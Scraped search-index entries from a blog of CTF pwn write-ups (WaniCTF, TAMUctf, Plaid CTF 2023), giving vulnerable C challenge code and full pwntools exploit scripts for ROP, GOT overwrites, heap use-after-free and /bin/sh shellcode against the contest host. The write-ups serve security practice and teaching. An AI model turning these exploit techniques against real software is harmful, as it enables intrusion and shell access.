timetable[choice.time[0]][choice.time[1]].name = choice.name; // The type of timetable is 0 by default since it is a global value. timetable[choice.time[0]][choice.time[1]].detail = \u0026elective_list[i]; } else { printf(\"You can't register this class\\n\"); } } void print_class_detail() { comma *choice = choose_time(timetable); if (choice-\u003etype == MANDATORY_CLASS_CODE) { print_mandatory_subject(choice-\u003edetail); } else if (choice-\u003etype == ELECTIVE_CLASS_CODE) { print_elective_subject(choice-\u003edetail); } } void write_memo() { comma *choice = choose_time(timetable); printf(\"WRITE MEMO FOR THE CLASS\\n\"); if (choice-\u003etype == MANDATORY_CLASS_CODE) { read(0, ((mandatory_subject *)choice-\u003edetail)-\u003ememo, 30); } else if (choice-\u003etype == ELECTIVE_CLASS_CODE) { read(0, ((elective_subject *)choice-\u003edetail)-\u003ememo, 30); } } void print_menu() { printf(\"1. Register Mandatory Class\\n\"); printf(\"2. Register Elective Class\\n\"); printf(\"3. See Class Detail\\n\"); printf(\"4. Write Memo\\n\"); printf(\"5. Exit\\n\"); printf(\"\u003e\"); } student register_student() { student new_student; printf(\"WELCOME TO THE TIME TABLE PROGRAM\\n\"); printf(\"Enter your name : \"); read(0, new_student.name, 9); printf(\"Enter your student id : \"); scanf(\"%d\", \u0026new_student.studentNumber); printf(\"Enter your major : \"); scanf(\"%d\", \u0026new_student.EnglishScore); return new_student; } const.h #define ELECTIVE_CLASS_CODE 0 #define MANDATORY_CLASS_CODE 1 typedef struct { char name[10]; int studentNumber; int EnglishScore; } student; typedef struct { char *name; int type; void *detail; } comma; typedef struct { char *name; int time[2]; char *target[4]; char memo[32]; char *professor; } mandatory_subject; typedef struct { char *name; int time[2]; char memo[32]; char *professor; int (*IsAva","date":"May 06, 2023","objectID":"/posts/wanictf-2023/:8:0","tags":["Writeup","WanitCTF","shellcoding","ROP","heap","type confusion"],"title":"WaniCTF 2023","uri":"/posts/wanictf-2023/"},{"categories":null,"content":"Copy \u0026 Paste Below is the source code of the challenge: #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cstring.h\u003e #define NOTE_LIST_LEN 16 #define MAX_NOTE_SIZE 4096 void init() { setvbuf(stdin, NULL, _IONBF, 0); setvbuf(stdout, NULL, _IONBF, 0); setvbuf(stderr, NULL, _IONBF, 0); alarm(180); } typedef struct note { int size; char *ptr; } note_t; note_t list[NOTE_LIST_LEN]; note_t copied; void menu() { printf(\"\\n---- memu ----\\n\"); printf(\"1. create note\\n\"); printf(\"2. show note\\n\"); printf(\"3. copy note\\n\"); printf(\"4. paste note\\n\"); printf(\"5. delete note\\n\"); printf(\"6. exit\\n\"); printf(\"--------------\\n\\n\"); } int get_idx() { int idx; printf(\"index: \"); if ((scanf(\"%d\", \u0026idx) != 1) || idx \u003c 0 || idx \u003e= NOTE_LIST_LEN) { printf(\"Invalid index!\\n\"); return -1; } return idx; } int get_size() { int size; printf(\"size (0-%d): \", MAX_NOTE_SIZE); if ((scanf(\"%d\", \u0026size) != 1) || size \u003c 0 || size \u003e MAX_NOTE_SIZE) { printf(\"Invalid size!\\n\"); return -1; } return size; } int is_empty(int idx) { int f = (list[idx].ptr == NULL); if (f) printf(\"The note is empty!\\n\"); return f; } void create() { int idx, size; if ((idx = get_idx()) == -1) return; if ((size = get_size()) == -1) return; list[idx].size = size; list[idx].ptr = (char *)malloc(list[idx].size); memset(list[idx].ptr, 0, list[idx].size); printf(\"Enter your content: \"); read(0, list[idx].ptr, list[idx].size); printf(\"Done!\\n\"); } void show() { int idx; if ((idx = get_idx()) == -1) return; if (is_empty(idx)) return; write(1, list[idx].ptr, list[idx].size); } void copy() { int idx; if ((idx = get_idx()) == -1) return; if (is_empty(idx)) return; copied = list[idx]; printf(\"Done!\\n\"); } void paste() { int idx; note_t pasted; if ((idx = get_idx()) == -1) return; if (is_empty(idx)) return; if (copied.ptr == NULL) { printf(\"Please copy a note before pasting!\\n\"); return; } pasted.size = list[idx].size + copied.size; if (pasted.size \u003c 0 || pasted.size \u003e MAX_NOTE_SIZE) { printf(\"Invalid size!\\nPaste failed!\\n\"); return; } pasted.ptr = (char *)malloc(pasted.size); memset(pasted.ptr, 0, pasted.size); sprintf(pasted.ptr, \"%s%s\", list[idx].ptr, copied.ptr); free(list[idx].ptr); list[idx] = pasted; printf(\"Done!\\n\"); } void delete () { int idx; if ((idx = get_idx()) == -1) return; if (is_empty(idx)) return; free(list[idx].ptr); list[idx].size = 0; list[idx].ptr = NULL; printf(\"Done!\\n\"); } int main() { init(); int c = 0; while (1) { menu(); printf(\"your choice: \"); scanf(\"%d\", \u0026c); if (c == 1) create(); else if (c == 2) show(); else if (c == 3) copy(); else if (c == 4) paste(); else if (c == 5) delete (); else if (c == 6) return 0; else printf(\"Invalid choice!\\n\"); scanf(\"%*[^\\n]\"); // fflush stdin } return 0; } The bug is in the copy method. The copy method will copy the list entry by value. So, if you call copy and then delete the entry, the copied will still hold pointer to the freed chunk. This leads to two bugs: Use-After-Free If you call copy, delete, and paste, the new chunk that is created with paste will contains the freed chunk metadata (Because the copied points to a freed chunk). Heap-Overflow You can mismatch the stored size in copied with the actual value that is being copied during paste. For example: Suppose you call copy, and now copied.size is 0x10, and copied.ptr is A. You delete it, and create a new chunk with size 0x20, and the newly created chunk was actually placed in A. Now, when you call paste, the copied.size is still 0x10, but during calling the sprintf(pasted.ptr, \"%s%s\", list[idx].ptr, copied.ptr);, the copied value is actually larger than 0x10. First, we need to get heap and libc leak with the first bug. To get a libc leak, copy and delete a chunk so that it went to unsorted bin. The chunk metadata will contains a libc address. Next, you call paste, and the new pasted chunk will contains the libc address. To get heap leak, we can simply freed two chunks to the tcache, and ensure the copied.ptr pointing to the last free chunk. Next, you call paste, and the new pa","date":"May 06, 2023","objectID":"/posts/wanictf-2023/:9:0","tags":["Writeup","WanitCTF","shellcoding","ROP","heap","type confusion"],"title":"WaniCTF 2023","uri":"/posts/wanictf-2023/"},{"categories":null,"content":" TAMUctf 2023 This weekend, I spent some of my free time solving challenges from TAMUctf 2023 for practice. I solved all the pwn challenges except Macchiato, and here is a short write-up that I created for all of the pwn challenges that I solved. Pwn ","date":"May 01, 2023","objectID":"/posts/tamuctf-2023/:0:0","tags":["Writeup","TAMUctf","shellcoding","ROP"],"title":"TAMUctf 2023","uri":"/posts/tamuctf-2023/"},{"categories":null,"content":"Inspector Gadget There is a buffer overflow in the pwnme function. ssize_t pwnme() { char buf[16]; // [rsp+0h] [rbp-10h] BYREF puts(\"pwn me\"); return read(0, buf, 0x60uLL); } The BOF length is large enough, so we can do the usual ROP. Script: from pwn import * exe = ELF(\"./inspector-gadget_patched\") libc = ELF(\"./libc.so.6\") context.binary = exe context.arch = 'amd64' context.encoding = 'latin' context.log_level = 'INFO' warnings.simplefilter(\"ignore\") def conn(): if args.LOCAL: r = process([exe.path]) if args.PLT_DEBUG: # gdb.attach(r, gdbscript=gdbscript) pause() else: r = remote(\"tamuctf.com\", 443, ssl=True, sni=\"inspector-gadget\") return r r = conn() pop_rdi = 0x000000000040127b payload = b'a'*0x10 + p64(exe.bss()+0x100) payload += p64(pop_rdi) + p64(exe.got['puts']) payload += p64(exe.plt['puts']) payload += p64(exe.symbols['pwnme']) r.sendlineafter(b'me\\n', payload) puts_libc = u64(r.recv(6).ljust(8, b'\\x00')) libc.address = puts_libc - libc.symbols['puts'] log.info(f'libc base: {hex(libc.address)}') xor_rax_rax = libc.address + 0x0000000000098225 one_gadget = libc.address + 0x4497f payload = b'a'*0x10 + p64(exe.bss()+0x100) payload += p64(xor_rax_rax) payload += p64(one_gadget) r.sendline(payload) r.interactive() Flag: gigem{ret2libc_r0p_g04t3d} ","date":"May 01, 2023","objectID":"/posts/tamuctf-2023/:1:0","tags":["Writeup","TAMUctf","shellcoding","ROP"],"title":"TAMUctf 2023","uri":"/posts/tamuctf-2023/"},{"categories":null,"content":"Unlucky Source code: #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e int main() { setvbuf(stdout, NULL, _IONBF, 0); setvbuf(stdin, NULL, _IONBF, 0); static int seed = 69; srand(\u0026seed); printf(\"Here's a lucky number: %p\\n\", \u0026main); int lol = 1; int input = 0; for (int i = 1; i \u003c= 7; ++i) { printf(\"Enter lucky number #%d:\\n\", i); scanf(\"%d\", \u0026input); if (rand() != input) { lol = 0; } } if (lol) { char flag[64] = {0}; FILE* f = fopen(\"flag.txt\", \"r\"); fread(flag, 1, sizeof(flag), f); printf(\"Nice work, here's the flag: %s\\n\", flag); } else { puts(\"How unlucky :pensive:\"); } } The bug is the seed that is being used is the address of seed, which is quite close to the main address that is being leaked. This caused us to be able to generate the same rand() value. Script: from pwn import * from ctypes import CDLL from ctypes.util import find_library libc = CDLL(find_library(\"c\")) p = remote(\"tamuctf.com\", 443, ssl=True, sni=\"unlucky\") p.recvuntil(b'number: ') seed = (int(p.recvline().strip(), 16) \u0026 0xffffffff) + 0x2ec3 libc.srand(seed) for i in range(7): p.sendlineafter(b':\\n', str(libc.rand()).encode()) p.interactive() Flag: gigem{1_n33d_b3tt3r_3ntr0py_s0urc3s} ","date":"May 01, 2023","objectID":"/posts/tamuctf-2023/:2:0","tags":["Writeup","TAMUctf","shellcoding","ROP"],"title":"TAMUctf 2023","uri":"/posts/tamuctf-2023/"},{"categories":null,"content":"Pointers Source code: #include \u003cstdio.h\u003e #include \u003cunistd.h\u003e void upkeep() { // Not related to the challenge, just some stuff so the remote works correctly setvbuf(stdin, NULL, _IONBF, 0); setvbuf(stdout, NULL, _IONBF, 0); setvbuf(stderr, NULL, _IONBF, 0); } void win() { char* argv[] = {\"/bin/cat\", \"flag.txt\", NULL}; execve(argv[0], argv, NULL); } void lose() { char* argv[] = {\"/bin/echo\", \"loser\", NULL}; execve(argv[0], argv, NULL); } void vuln() { char buf[010]; printf(\"Interaction pls: \"); read(0, buf, 10); } int main() { upkeep(); void* func_ptrs[] = {lose, win}; printf(\"All my functions are being stored at %p\\n\", func_ptrs); vuln(); void (*poggers)() = func_ptrs[0]; poggers(); } The bug is in vuln, where the buf is using 010 representation, which equals to 8. We can partially overwrite the rbp value, which we can use to shift the func_ptrs starting address to that the first element is win instead of lose. Script: from pwn import * p = remote(\"tamuctf.com\", 443, ssl=True, sni=\"pointers\") p.recvuntil(b'at ') func_ptr_addr = int(p.recvline().strip(), 16) new_rbp = func_ptr_addr + 0x28 p.sendlineafter(b'pls: ', b'a'*8+p64(new_rbp)[:2]) p.interactive() Flag: gigem{small_overflows_are_still_effective} ","date":"May 01, 2023","objectID":"/posts/tamuctf-2023/:3:0","tags":["Writeup","TAMUctf","shellcoding","ROP"],"title":"TAMUctf 2023","uri":"/posts/tamuctf-2023/"},{"categories":null,"content":"Randomness We were given the source code of the chall: #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cunistd.h\u003e void win() { char* argv[] = {\"/bin/cat\", \"flag.txt\", NULL}; execve(argv[0], argv, NULL); } void foo() { unsigned long seed; puts(\"Enter a seed:\"); scanf(\"%lu\", \u0026seed); srand(seed); } void bar() { unsigned long a; puts(\"Enter your guess:\"); scanf(\"%lu\", a); if (rand() == a) { puts(\"correct!\"); } else { puts(\"incorrect!\"); } } int main() { puts(\"hello!\"); foo(); bar(); puts(\"goodbye!\"); } The bug is in the scanf(\"%lu\", a). Instead of call scanf with the address of a, it uses the value instead. Because the binary is No PIE, we can simply set the seed value to the GOT of puts, and then during calling bar, the a value isn’t uninitialized, which means it still contains the value that we set for the seed. That means, during calling the scanf(\"%lu\", a), it will overwrite the GOT of puts with the value that we set (in this case, with the win address). from pwn import * exe = ELF(\"./randomness\") p = remote(\"tamuctf.com\", 443, ssl=True, sni=\"randomness\") p.sendline(str(exe.got['puts']).encode()) p.sendline(str(exe.symbols['win']).encode()) p.interactive() Flag: gigem{value_or_pointer_is_an_important_distinction} ","date":"May 01, 2023","objectID":"/posts/tamuctf-2023/:4:0","tags":["Writeup","TAMUctf","shellcoding","ROP"],"title":"TAMUctf 2023","uri":"/posts/tamuctf-2023/"},{"categories":null,"content":"Sea Shells We were given the source code of the chall: #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e int check(unsigned long n, unsigned long sold) { if ((n \u0026 0xffff) == (sold \u0026 0xffff)) { return 1; } return 0; } void vuln() { unsigned long num_sold; char resp; unsigned long a; unsigned long b; unsigned long c; unsigned long d; num_sold = rand(); printf(\"It's not that easy though, enter 4 numbers to use to guess!\\n\"); do { // ask user for input printf(\"1st number: \"); scanf(\"%lu\", \u0026a); printf(\"2nd number: \"); scanf(\"%lu\", \u0026b); printf(\"3rd number: \"); scanf(\"%lu\", \u0026c); printf(\"4th number: \"); scanf(\"%lu\", \u0026d); // perform some calculations on the numbers d = d + c; c = c ^ b; b = b - a; if (check(d, num_sold)) { printf(\"Woohoo! That's exactly how many she sold!\\n\"); printf(\"Here's a little something Sally wants to give you for your hard work: %lx\\n\", \u0026d); } else { printf(\"Sorry, that's not quite right :(\\n\"); } // go again? printf(\"Would you like to guess again? (y/n) \"); scanf(\"%s\", \u0026resp); } while (resp == 'Y' || resp == 'y'); return; } void welcome() { printf(\"Sally sold some sea SHELLS!\\n\"); printf(\"Try to guess exactly how many she sold, I bet you can't!!\\n\"); } int main() { setvbuf(stdin, NULL, _IONBF, 0); setvbuf(stdout, NULL, _IONBF, 0); setvbuf(stderr, NULL, _IONBF, 0); welcome(); vuln(); printf(\"'bye now'\\n-Sally\\n\"); return 0; } The bug is in the scanf(\"%s\", \u0026resp);, which is clearly a buffer overflow. Another thing to notice is that the stack address is executable. That means, this is a shellcoding challenge with constraints that there will be some operations performed to our inputted shellcode. I reuse the shellcode in this blog, and to fulfill the constraints, simply use z3. Script: from pwn import * from z3 import * exe = ELF('./sea-shells') shellcode = b'1\\xf6VH\\xbb/bin//shST_\\xf7\\xee\\xb0;\\x0f\\x05' s = Solver() d = BitVec('d', 64) c = BitVec('c', 64) b = BitVec('b', 64) a = BitVec('a', 64) s.add(((d + c) \u0026 0xffff) == 0x4567) s.add((c ^ b) == u64(shellcode[:8])) s.add((b - a) == u64(shellcode[8:16])) s.add(a == u64(shellcode[16:].ljust(8, b'\\x00'))) # print(hex(u64(shellcode[:8]))) # print(hex(u64(shellcode[8:16]))) # print(hex(u64(shellcode[16:].ljust(8, b'\\x00')))) res = s.check() print(s.check()) if res == sat: print(s.model()) ans = s.model() x_a = ans.evaluate(a).as_long() x_b = ans.evaluate(b).as_long() x_c = ans.evaluate(c).as_long() x_d = ans.evaluate(d).as_long() print(f'x_a = {hex(x_a)}, {x_a = }') print(f'x_b = {hex(x_b)}, {x_b = }') print(f'x_c = {hex(x_c)}, {x_c = }') print(f'x_d = {hex(x_d)}, {x_d = }') else: exit() r = remote(\"tamuctf.com\", 443, ssl=True, sni=\"sea-shells\") # r = process('./sea-shells', env={}) # pause() r.sendlineafter(b'number: ', str(x_a).encode()) r.sendlineafter(b'number: ', str(x_b).encode()) r.sendlineafter(b'number: ', str(x_c).encode()) r.sendlineafter(b'number: ', str(x_d).encode()) r.recvuntil(b'work: ') d_addr = int(r.recvline().strip(), 16) sh_addr = d_addr + 0x8 payload = b'n'*0x9 payload += p64(d_addr + 64) payload += p64(sh_addr) r.sendline(payload) r.interactive() Flag: gigem{cr34t1v3_5h3llc0d3_ftw} ","date":"May 01, 2023","objectID":"/posts/tamuctf-2023/:5:0","tags":["Writeup","TAMUctf","shellcoding","ROP"],"title":"TAMUctf 2023","uri":"/posts/tamuctf-2023/"},{"categories":null,"content":"Bank We were given the source code of the chall: #include \u003cstdio.h\u003e long accounts[100]; char exit_msg[] = \"Have a nice day!\"; void deposit() { int index = 0; long amount = 0; puts(\"Enter the number (0-100) of the account you want to deposit in: \"); scanf(\"%d\", \u0026index); puts(\"Enter the amount you want to deposit: \"); scanf(\"%ld\", \u0026amount); accounts[index] += amount; } int main() { setvbuf(stdout, NULL, _IONBF, 0); setvbuf(stdin, NULL, _IONBF, 0); deposit(); deposit(); puts(exit_msg); } The bug is we can use negative index in the accounts, and because it is placed in the bss area, we can modify GOT of puts to one_gadget and spawn a shell. Script: from pwn import * p = remote(\"tamuctf.com\", 443, ssl=True, sni=\"bank\") offset = -16 value = -184513 p.sendline(str(offset).encode()) p.sendline(str(value).encode()) p.interactive() Flag: gigem{a_v3ry_h3fty_d3p0s1t} ","date":"May 01, 2023","objectID":"/posts/tamuctf-2023/:6:0","tags":["Writeup","TAMUctf","shellcoding","ROP"],"title":"TAMUctf 2023","uri":"/posts/tamuctf-2023/"},{"categories":null,"content":"Encryptinator We were given the souce code of the chall: #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003ctime.h\u003e #include \u003cstring.h\u003e #define MAX_LEN 1024 #define FLAG_LEN 30 void upkeep() { // Not related to the challenge, just some stuff so the remote works correctly setvbuf(stdin, NULL, _IONBF, 0); setvbuf(stdout, NULL, _IONBF, 0); setvbuf(stderr, NULL, _IONBF, 0); } void print_hex(char* buf, int len) { for (int i=0; i\u003clen; i++) { printf(\"%02x\", (unsigned char)buf[i]); } printf(\"\\n\"); } void encrypt(char* msg, int len, char* iv) { char key[len]; FILE *file; file = fopen(\"/dev/urandom\", \"rb\"); fread(key, len, 1, file); fclose(file); for (int i=0; i\u003clen; i++) { msg[i] = msg[i] ^ key[i] ^ iv[i % 8]; } } void randomize(char* msg, int len, unsigned long seed, unsigned long iterations) { seed = seed * iterations + len; if (iterations \u003e 1) { randomize(msg, len, seed, iterations- 1); } else { encrypt(msg, len, ((char *) \u0026seed)); } } char menu() { char option; printf(\"\\nSelect from the options below:\\n\"); printf(\"1. Encrypt a message\\n\"); printf(\"2. View the encrypted message\\n\"); printf(\"3. Quit\\n\"); printf(\"\u003e \"); scanf(\"%c\", \u0026option); while (getchar() != '\\n'); return option; } void console() { FILE* file; long seed; int index; int read_len; char buf[MAX_LEN] = \"\"; int len = -1; while (1) { switch(menu()) { case '1': // get user input printf(\"\\nPlease enter message to encrypt: \"); fgets(buf, MAX_LEN-FLAG_LEN, stdin); len = strlen(buf); // add flag to the buffer file = fopen(\"flag.txt\", \"rb\"); fread(buf + len, FLAG_LEN, 1, file); fclose(file); len += FLAG_LEN; // encrypt seed = ((long) rand()) \u003c\u003c 32 + rand(); randomize(buf, len, seed, buf[0]); break; case '2': if(len == -1) { printf(\"Sorry, you need to encrypt a message first.\\n\"); break; } index = 0; printf(\"\\nRead a substring of the encrypted message.\"); printf(\"\\nPlease enter the starting index (%d - %d): \", index, len); scanf(\"%d\", \u0026index); while (getchar() != '\\n'); if (index \u003e len) { printf(\"Error, index out of bounds.\\n\"); break; } printf(\"Here's your encrypted string with the flag:\\n\"); print_hex(buf+index, len - index); break; case '3': printf(\"goodbye.\\n\"); exit(0); default: printf(\"There was an error processing that request, please try again.\\n\"); break; } } } int main() { srand(time(NULL)); upkeep(); // welcome printf(\"Welcome to my encryption engine: ENCRYPT-INATOR!\\n\"); printf(\"I'll encrypt anything you want but no guarantees you'll be able to decrypt it,\\n\"); printf(\"I haven't quite figured out how to do that yet... :(\\n\"); console(); } There is a bug where we can set the index to negative values, which means we can leak some values which stored above the main stack frames. With the bug, we can recover the key and iv values that is being used to encrypt it. Script: from pwn import * p = remote(\"tamuctf.com\", 443, ssl=True, sni=\"encryptinator\") # p = process('./encryptinator', env={}) # pause() p.sendlineafter(b'\u003e ', b'1') payload = b'\\x30aaaaaaaa' p.sendlineafter(b'encrypt: ', payload) p.sendlineafter(b'\u003e ', b'2') p.sendlineafter(b': ', b'-2448') p.recvuntil(b'flag:\\n') out = bytes.fromhex(p.recvline().strip().decode()) key = out[:0x28] # print(hex(u64(key[:8]))) iv = out[0x98:0xa0] # print(hex(u64(iv))) p.sendlineafter(b'\u003e ', b'2') p.sendlineafter(b': ', b'0') p.recvuntil(b'flag:\\n') enc = bytes.fromhex(p.recvline().strip().decode()) dec = b'' for i in range(len(enc)): dec += bytes([enc[i] ^ key[i] ^ iv[i % 8]]) print(dec) Flag: gigem{00ps_b4d_3rr0r_ch3ck1ng} ","date":"May 01, 2023","objectID":"/posts/tamuctf-2023/:7:0","tags":["Writeup","TAMUctf","shellcoding","ROP"],"title":"TAMUctf 2023","uri":"/posts/tamuctf-2023/"},{"categories":null,"content":"Pwnme We were given a binary called pwnme and its custom library called libpwnme.so. Below is the disassembly of the binary: int __cdecl main(int argc, const char **argv, const char **envp) { pwnme(argc, argv, envp); return 0; } Some interesting functions inside the custom library: ssize_t pwnme() { char buf[16]; // [rsp+0h] [rbp-10h] BYREF setup(); puts(\"pwn me\"); return read(0, buf, 0x48uLL); } int win() { return system(\"/bin/bash\"); } Notice that there is buffer overflow in the custom library, and our target is to call the win function to get a shell. The given binary is Partial RELRO and No PIE. This means that we can modify the GOT table of the binary. Currently, the GOT only contains one function, which is pwnme function loaded from the custom library. My idea is to overwrite the GOT entry so that when the binary called pwnme, it will call win instead. Checking the available gadgets in the binary with ROPgadget and ropr, I found some interesting gadgets. 0x00000000004011af : add byte ptr [rbp - 0x3d], bl ; sub rax, rsi ; ret 0x000000000040118f : add bl, al ; mov rax, qword ptr [rdi] ; ret 0x0000000000401191 : mov rax, qword ptr [rdi] ; ret 0x000000000040118b : pop rdi ; ret The idea is to use this three gadgets to shift the last byte of the address pwnme stored in the GOT, so that it points to win instead (because win and pwnme is very close to each other). We control rbp with the BOF bug, we can set the rdi to address that we want which means the al value is controllable, which means we can set the bl values. If we set the rbp value to the address of GOT pwnme+0x3d, and then set the bl properly, we will be able to shift the GOT. After that, simply call the pwnme plt, and it will call win instead. Notes that the BOF length is quite small, and I need to do ROP twice due to this length constraint + misalignment stack (which can caused an issue during return). Script: from pwn import * exe = ELF(\"./pwnme_patched\") context.binary = exe context.arch = 'amd64' context.encoding = 'latin' context.log_level = 'INFO' warnings.simplefilter(\"ignore\") def conn(): if args.LOCAL: r = process([exe.path]) if args.PLT_DEBUG: # gdb.attach(r, gdbscript=gdbscript) pause() else: r = remote(\"tamuctf.com\", 443, ssl=True, sni=\"pwnme\") return r r = conn() pop_rdi = 0x000000000040118b mov_rax_ptr_rdi = 0x0000000000401191 add_bl_al = 0x0040118f add_rbp_bl = 0x00000000004011af payload = b'a'*0x10 payload += p64(exe.got['pwnme']+0x3d) payload += p64(pop_rdi) + p64(0x4010c5) + p64(mov_rax_ptr_rdi) # Set al to 0xe8 payload += p64(add_bl_al) payload += p64(exe.plt['pwnme']) # misalign stack, need to do second ROP r.sendafter(b'pwn me\\n', payload) payload = b'a'*0x10 payload += p64(exe.got['pwnme']+0x3d) payload += p64(add_rbp_bl) payload += p64(exe.plt['pwnme']) r.sendafter(b'pwn me\\n', payload) r.interactive() Flag: gigem{r0p_g4dg3ts_r_c00l} ","date":"May 01, 2023","objectID":"/posts/tamuctf-2023/:8:0","tags":["Writeup","TAMUctf","shellcoding","ROP"],"title":"TAMUctf 2023","uri":"/posts/tamuctf-2023/"},{"categories":null,"content":"Contrived Shellcode We were given this source code: #include \u003csys/mman.h\u003e #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cstring.h\u003e unsigned char whitelist[] = \"\\x00\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0b\\x0c\\x0d\\x0e\\x0f\"; void check(unsigned char* code, int len) { for (int i = 0; i \u003c len; i++) { if (memchr(whitelist, code[i], sizeof(whitelist)) == NULL) { printf(\"Oops, shellcode contains blacklisted character %02X at offset %d.\\n\", code[i], i); exit(-1); } } } int main() { unsigned char* code = mmap(NULL, 0x1000, PROT_EXEC|PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0); int len = read(0, code, 0x100); if (len \u003e 0) { if (code[len - 1] == '\\n') { code[len - 1] = '\\0'; } check(code, len); ((void (*)())(code))(); } } So, this is a shellcoding challenge where the char is limited to the given whitelist. My first step was to check what is the available opcode based on the given whitelist (I use this website to help me for initial analysis). Turns out, we have plenty instructions related to or, add, and syscall. However, all the available opcodes only allowed us to play with max 32-bits operand and registers. Checking on the gdb, during calling the shellcode. rdx was set to the address of our shellcode (which is writeable region). rdi was pointing to the whitelist array (which is writeable region). My approach to solve this challenge is to do three syscalls, which are: chdir('/') chdir('bin') execve('sh') This approach was taken by me because we can only play with 32-bit registers, which mean the maximum number of bytes that I can set is only 4. So, the maximum string that I could craft is only 3 chars (because last byte need to be null), which is why I need to split the chdir one-by-one to fulfill the constraints. Calling the first and second chdir is easy. rdi is already pointing to a writeable region, and the given opcodes also allowed us to modify the value pointed by rdi. So, we can simply construct string /\\x00 during the first chdir. After calling the first chdir, we just need to modify the value pointed by rdi again to be bin\\x00 and call chdir again. Now, we’re ready to call execve('sh'). There is a slight problem in here. Same as before, we can simply modify again the rdi pointed value to be sh\\x00. And then, in order to successfully spawn a shell, ideally the rsi and rdx should be null. In this case, the rsi is already set to null since the start of the program. However, remember that the rdx value is not null, it still contains the shellcode address. As I mentioned before, the available opcodes can’t modify the rdx value, but some of them can modify the value pointed by rdx. We need to set the pointed value to 0 to make the execve call succeed. But, remember that we can only edit 4 bytes, which means up until now, we’re only able to clear the pointed value lower 4 bytes, but the higher 4 bytes still remains. Observed that during executing a syscall, the rcx value will be used to store the rip. Which means, after you call syscall, the rcx will be pointing to your shellcode address as well. This will be useful during executing the execve('sh'). Luckily, the given opcodes allow us to modify the value of cl (the least significant bytes of rcx) and we can also modify the value pointed by rcx. This means, to clear the higher 4 bytes of the pointed value ofrdx, we can simply adjust the rcx value to point to the rdx+4, and then nullify the pointed value. By doing this, all of the constraints has been fulfilled and we can smoothly spawn a shell. Another thing that worth to be mentioned during making my payloads smaller is that I notice that there are a lot of times where we need to quickly nullify the pointed value. The trick that I use is to set the pointed value of edx to 0xffffffff. To nullify the value, simply or it with edx and then add it by 1. This trick helps me a lot to shorten my shellcode. This is my solver script: from pwn import * p = remote(\"tamuctf.com\", 443, ssl=True, sni=\"contrived-shellcode\") # p = pro","date":"May 01, 2023","objectID":"/posts/tamuctf-2023/:9:0","tags":["Writeup","TAMUctf","shellcoding","ROP"],"title":"TAMUctf 2023","uri":"/posts/tamuctf-2023/"},{"categories":null,"content":" Plaid CTF 2023 Last weekend, I played with the Blue Water team in the Plaid CTF 2023. We had the honor of not only competing but also securing first place in this prestigious event. It was an intense and exciting competition, and we all put our skills to the test. A huge shoutout and thanks to my awesome teammates for their fantastic teamwork during the Plaid CTF 2023! We secured the first place One of the pwn challenges that we were able to tackle was called “Collector.” Remarkably, we were the team that first blooded this particular challenge, and we remained the only team to successfully solve it. In this blog post, I’ll be walking you through our approach to this challenge and how we managed to crack it. We first blooded the challenge and remained the only team to successfully solve it Pwn ","date":"Apr 17, 2023","objectID":"/posts/plaidctf-2023/:0:0","tags":["Writeup","PlaidCTF","pwn","web","heap","postgresql","collation"],"title":"Plaid CTF 2023","uri":"/posts/plaidctf-2023/"},{"categories":null,"content":"Collector Description Shiver me timbers! We shan’t be running you a rig here. The scuttlebut be that the greatest booty in all the land be ready and waiting to barter. Bring yer coin ye scurvy dog and make off with enough gear to make yer husband, yer kids, and yer parrot into right swashbucklers. ","date":"Apr 17, 2023","objectID":"/posts/plaidctf-2023/:1:0","tags":["Writeup","PlaidCTF","pwn","web","heap","postgresql","collation"],"title":"Plaid CTF 2023","uri":"/posts/plaidctf-2023/"},{"categories":null,"content":"Initial Analysis For this challenge, we were provided with a .tgz file containing the docker and challenge sources. In summary, the challenge consisted of four containers that needed to be spawned: web webhook maindb workerdb Each container had its own responsibilities, but to summarize: maindb is the master db that is used by the container web. workerdb is the replica db that is used by the container webhook. The WAL replication that is used is replica or streaming replication (based on the postgresql maindb config in the given file). web is the main container that we interacted with (the website interface + the API) webhook is a container that will be used by the web to handle one of the API call that we can use (we will discuss this later). After reviewing the maindb schema, we found that a total of seven tables had been created: hooks items market initial_inventory inventory users flag As it turned out, our flag was stored within the flag table, which meant that our ultimate objective was to find a way to interact with the table and extract its contents. Our next step was to inspect the web container, starting with a review of the routes/index.tsxsource code. This file contained the primary API logic that we needed to interact with. import { create } from \"domain\"; import { createEffect, createRenderEffect, createSignal, For, onCleanup, Show } from \"solid-js\"; import { FormError, useRouteData } from \"solid-start\"; import { createServerAction$, createServerData$, redirect, } from \"solid-start/server\"; import sql from \"~/db\"; import { getUser, getUserSession, logout, requireUserId } from \"~/db/session\"; import * as fs from 'node:fs/promises'; import { requestHook } from \"~/db/hook\"; import { Form } from \"solid-start/data/Form\"; import toast from \"solid-toast\"; const COIN_ID = '0'; type MarketItem = { id: string, name: string, kind: string, bid_price: number | null, ask_price: number | null, bid_size: number | null, ask_size: number | null, }; type RouteData = { userId: string, market: MarketItem[], inventory: { [item_id: string]: number }, watchedItems: string[] } export function routeData() { return createServerData$\u003cRouteData\u003e(async (_, { request }) =\u003e { const userId = await requireUserId(request); const markets = await sql` SELECT kind, name, items.id, bid_price, bid_size, ask_price, ask_size FROM items LEFT JOIN market ON market.item_id = items.id ORDER BY items.id ASC `; const inventory = await sql` SELECT item_id, count FROM inventory WHERE user_id = ${userId} AND count \u003e 0 `; const inventoryDict = Object.fromEntries(inventory.map(x =\u003e [x.item_id, Number(x.count)])); const watching = await sql` SELECT DISTINCT kind FROM hooks WHERE user_id = ${userId} `; function stringnum(x: string | null): number | null { if (x) return Number(x); else return null; } const marketArray = markets.map(({ id, name, kind, bid_price, ask_price, bid_size, ask_size }) =\u003e { return { id, kind, name, bid_price: stringnum(bid_price), bid_size: stringnum(bid_size), ask_price: stringnum(ask_price), ask_size: stringnum(ask_size), } }); return { userId, market: marketArray, inventory: inventoryDict, watchedItems: watching.map(x =\u003e x.kind) }; }); } export default function Home() { const data = useRouteData\u003ctypeof routeData\u003e(); const [, { Form: LogoutForm }] = createServerAction$((f: FormData, { request }) =\u003e logout(request) ); const [transacting, { Form: Transact }] = 